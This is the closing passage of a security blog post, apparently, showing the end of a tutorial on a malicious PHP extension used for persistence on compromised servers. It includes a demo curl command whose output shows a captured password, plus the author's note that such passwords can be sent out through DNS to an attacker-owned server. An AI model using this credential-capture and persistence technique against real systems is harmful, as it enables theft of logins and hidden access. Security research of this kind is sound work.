+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mothra@arcadia:~/php-7.2.8/ext/Allocer| 
+⇒  curl localhost:8888/k.php --data "pass=s0S3cur3"
+Password: s0S3cur3
+</code></pre></div></div>
+<p>        
+Now this password can be saved inside a file or just sent to us via DNS to an authoritative DNS server owned by us.</p>
+
+<h2 id="0x05-final-words">0x05 Final words</h2>
+<p>        
+PHP extensions is a powerful way to keep a persistence inside a compromised target, and of course, is the best excuse to start playing with PHP internals.</p>
+
+<p>        
+If you find useful this article, or wanna point me to an error or a typo, feel free to contact me at twitter <a href="https://twitter.com/thexc3ll">@TheXC3LL</a>.</p>
+
+
+
+
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/pages-themes">pages-themes</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
